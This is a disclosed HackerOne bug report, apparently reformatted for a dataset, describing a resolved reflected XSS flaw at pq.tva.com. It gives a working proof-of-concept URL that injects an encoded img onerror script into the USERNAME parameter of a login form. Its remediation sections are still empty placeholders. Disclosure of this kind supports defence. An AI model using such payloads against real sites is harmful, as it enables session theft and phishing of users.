---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1362995'
original_report_id: '1362995'
title: xss reflected - pq.tva.com
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: tennessee-valley-authority
created_at: '2021-10-07T17:18:19.331Z'
disclosed_at: '2023-09-11T11:51:23.486Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 13
asset_identifier: '*.tva.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# xss reflected - pq.tva.com

## Metadata

- HackerOne Report ID: 1362995
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: tennessee-valley-authority
- Disclosed At: 2023-09-11T11:51:23.486Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

POC: 

https://pq.tva.com/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020
src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7

## Impact

With the help of xss a hacker or attacker can perform social engineering on users by redirecting them from real website to fake one. hacker can steal their cookies and download a malware on their system, and there are many more attacking scenarios a skilled attacker can perform with xss.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
